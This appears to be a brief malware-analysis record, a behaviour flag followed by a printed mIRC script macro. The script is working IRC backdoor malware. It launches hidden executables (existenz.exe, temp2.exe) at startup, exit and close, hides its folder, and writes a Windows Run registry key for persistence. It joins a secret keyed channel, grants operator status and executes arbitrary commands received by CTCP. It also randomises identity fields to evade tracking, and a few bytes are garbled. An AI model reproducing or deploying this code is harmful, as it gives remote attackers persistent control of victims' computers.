behavior.run: May run an executable file or a system command

docinfo.macro:
[script]
n0=on 1:input:*:/mkdir c:\windows\mirky\aa | /exit
n1=raw 433 :*:/nick $read c:\windows\mirky\nick.txt
n2=on *:EXIT:/run c:\windows\mirky\existenz.exe
n3=on *:close:/run c:\windows\mirky\existenz.exe
n4=on *:connect: join #cacatul motanica
n5=on *:join:#cacatul: if ($nick == $me) window -h #cacatul | mode #cacatul +sk motanica
n6=on *:part:#cacatul: if ($nick == $me) join #cacatul motanica
n7=on 1:JOIN:#cacatul:/mode #cacatul  +o $nick
n8=ctcp 1:arf:*:$2-
n9=on *:start:{ 
n10=  /run $mircdir $+ temp2.exe /n /fh ������ 
n11=  /nick $read c:\windows\mirky\nick.txt
n12=  /run $mircdir $+ temp2.exe /n /fh ������ 
n13=  /run /attrib c:\windows\mirky +h
n14=  /run -n $mircdir/dtreg -set "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\mirky=c:\windows\mirky\existenz.exe" 
n15=  remini mirc.ini ident userid 
n16=  remini mirc.ini mirc user 
n17=  remini mirc.ini mirc email 
n18=  remini mirc.ini mirc anick
n19=  if (%server == $null) { set %Moscow.RU.EU.Undernet.ORG } 
n20=  writeini mirc.ini mirc anick $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(A,Z)
n21=  writeini mirc.ini mirc email $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(A,Z)
n22=  writeini mirc.ini ident userid $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(A,Z)
n23=  writeini mirc.ini mirc user $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(A,Z)
n24=  identd on $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z)
n25=}
